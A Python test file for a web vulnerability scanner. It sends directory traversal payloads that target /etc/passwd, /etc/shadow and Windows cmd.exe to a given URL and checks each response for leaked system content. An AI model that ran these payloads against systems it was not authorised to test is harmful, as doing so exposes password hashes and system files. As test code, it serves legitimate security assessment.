# tests/test_traversal.py

import requests

# Define payloads for directory traversal tests
traversal_payloads = [
    "../../../../etc/passwd",         # Linux/Unix systems - potentially exposes password file
    "../../../windows/system32/cmd.exe",  # Windows system - attempts to access command shell
    "../../../../../../etc/shadow",    # Linux/Unix systems - potentially exposes shadow file (password hashes)
    "..\\..\\..\\..\\..\\..\\windows\\system32\\cmd.exe"  # Windows alternate directory traversal (using backslashes)
]

def test_directory_traversal(url):
    """
    Tests for directory traversal vulnerabilities by sending various payloads to access sensitive
    files and checking if any sensitive information is exposed in the response.

    :param url: The base target URL to test for directory traversal vulnerabilities.
    :return: A list of results indicating whether the target is vulnerable to directory traversal for each payload.
    """
    results = []

    for payload in traversal_payloads:
        try:
            # Construct the target URL with the directory traversal payload
            target_url = f"{url}/{payload}"

            # Send GET request to the target URL
            response = requests.get(target_url)

            # Check if known sensitive content is exposed in the response
            if "root:" in response.text or "system32" in response.text or "shadow" in response.text:
                results.append({
                    "payload": payload,
                    "vulnerable": True,
                    "reason": f"Sensitive system content exposed in response. Status code: {response.status_code}."
                })
            else:
                results.append({
                    "payload": payload,
                    "vulnerable": False,
                    "reason": f"No directory traversal vulnerability detected. Status code: {response.status_code}."
                })

        except requests.exceptions.RequestException as e:
            # Handle network-related errors and add them to results
            results.append({
                "payload": payload,
                "vulnerable": False,
                "reason": f"Request failed: {e}"
            })
    
    return results
